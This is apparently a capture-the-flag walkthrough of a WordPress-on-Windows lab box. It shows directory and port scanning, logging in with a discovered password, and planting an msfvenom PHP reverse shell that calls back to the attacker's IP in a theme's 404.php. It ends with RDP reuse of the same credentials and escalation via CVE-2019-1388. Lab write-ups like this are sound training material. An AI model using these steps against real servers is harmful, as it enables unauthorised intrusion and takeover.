We can see that a webserver is hosted on the machine.

While waiting for the recommended time, :) let’s run a gobuster directory scan:

```bash
gobuster dir --wordlist=/usr/share/dict/directory-list-2.3-medium.txt --url=http://10.10.36.56/
```

we get /retro as one of the results. It leads to a webpage. :)
lets run a threader3000 scan on the background.

```bash
python threader3000
10.10.36.56
```

Running the suggested nmap scan with curent gobuster scan results:

hmm :P So the site is a wordpress site. From the posts we can see that wade is user of the wordpress. Lets check out for different pages.

parzival ends up working as the password. xD

Hmm, :) we can access Appearance->Theme editor. ;) Let’s use a php-reverse-shell. I am going to change 404.php with the reverse shell code. :)

Setting up a netcat listener:

```bash
nc -lvnp 1234
```

The usual php-reverse-shell that I use was giving issues so I generated a new one using msfvenom:

```bash
msfvenom -p php/reverse_php LHOST=10.17.47.158 LPORT=4444 -f raw -o mew.php
```

After setting up a netcat listener for the same. :)

:) we finally get access to the system but as user: iusr

The shell just keeps on dying. :-;

Hmm, :) Trying to connect to the server via rdp using the wade’s wordpress credential works

```bash
xfreerdp /u:wade /p:parzival /cert:ignore /v:10.10.36.56 /workarea
```

There is a bookmark in chrome about a vulnerability: [CVE-2019–1388](https://nvd.nist.gov/vuln/detail/CVE-2019-1388)

:) Looking at this Video regarding the vulnerability:

<iframe width="560" height="315" src="https://www.youtube.com/embed/3BQKpPNlTSo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

the file in the recycle bin matches the one in the video, recovering it and following the procedure to get system previleges, we can get our final flag. :)
